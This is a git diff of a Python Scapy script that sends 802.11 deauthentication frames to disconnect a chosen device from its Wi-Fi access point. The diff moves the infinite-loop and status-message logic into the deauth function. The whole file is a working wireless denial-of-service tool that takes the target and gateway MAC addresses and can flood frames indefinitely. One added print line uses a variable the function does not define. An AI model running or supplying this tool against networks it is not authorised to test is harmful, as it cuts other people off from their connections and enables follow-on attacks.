@@ -1,9 +1,11 @@
 from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 from scapy.sendrecv import sendp
+import argparse
 
 
 # source code : https://www.thepythoncode.com/code/force-a-device-to-disconnect-scapy
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0", verbose=1):
+
+def deauth(target_mac, gateway_mac, inter=0.1, count=0, iface="wlan0", verbose=1):
     reason = int(input("Please choose one of the following reason :\n"
                        "1 - Unspecified\n"
                        "4 - Disassociated due to inactivity\n"
@@ -29,19 +31,32 @@ def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0"
     # stack them up
     packet = RadioTap() / dot11 / Dot11Deauth(reason=reason)
 
+    if count == 0:
+        # if count is 0, it means we loop forever (until interrupt)
+        loop = 1
+        count = None
+    else:
+        loop = 0
+
+    # printing some info messages
+    if verbose:
+        if count:
+            print(f"[+] Sending {count} deauthentication frames every {interval}s...")
+        else:
+            print(f"[+] Sending deauthentication frames every {interval}s forever...")
+
     # send the packet
     sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
 
 
 if __name__ == '__main__':
-    import argparse
-
     parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
     parser.add_argument("target", help="Target MAC address to deauthenticate")
     parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
     parser.add_argument("-c", "--count", help="Number of deauthentication frames to send, specify 0 to keep sending "
                                               "infinitely, default is 0", default=0)
-    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms",
+    parser.add_argument("--interval",
+                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                         default=0.1)
     parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                         default="wlan0")
@@ -54,17 +69,5 @@ if __name__ == '__main__':
     interval = float(args.interval)
     iface = args.iface
     verbose = args.verbose
-    if count == 0:
-        # if count is 0, it means we loop forever (until interrupt)
-        loop = 1
-        count = None
-    else:
-        loop = 0
-    # printing some info messages"
-    if verbose:
-        if count:
-            print(f"[+] After choosing a reason code, sending {count} frames every {interval}s...")
-        else:
-            print(f"[+] After choosing a reason code, sending frames every {interval}s for ever...")
 
-    deauth(target, gateway, interval, count, loop, iface, verbose)
+    deauth(target, gateway, interval, count, iface, verbose)
